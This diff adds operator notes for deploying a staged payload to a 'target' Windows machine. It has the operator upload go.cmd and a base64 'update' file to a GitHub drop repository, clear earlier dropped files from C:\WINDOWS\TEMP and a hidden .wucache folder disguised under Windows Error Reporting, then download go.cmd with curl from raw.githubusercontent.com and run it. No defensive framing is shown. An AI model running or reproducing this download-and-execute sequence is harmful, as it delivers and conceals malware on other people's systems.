@@ -1,0 +1,17 @@
+# 1) Upload to GitHub root (MUST overwrite/add):
+#      go.cmd
+#      update.b64
+#
+# 2) On target, use a NEW local filename (old run.cmd in TEMP is stale):
+
+del /f /q C:\WINDOWS\TEMP\run.cmd
+del /f /q C:\WINDOWS\TEMP\go.cmd
+del /f /q "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\*"
+
+curl.exe -L -o C:\WINDOWS\TEMP\go.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/refs/heads/main/go.cmd
+C:\WINDOWS\TEMP\go.cmd
+
+# You MUST see this first line:
+#   === GO.CMD BUILD 20260729E ===
+#
+# If you still see "Re-upload payload.b64" you are running OLD run.cmd from TEMP.
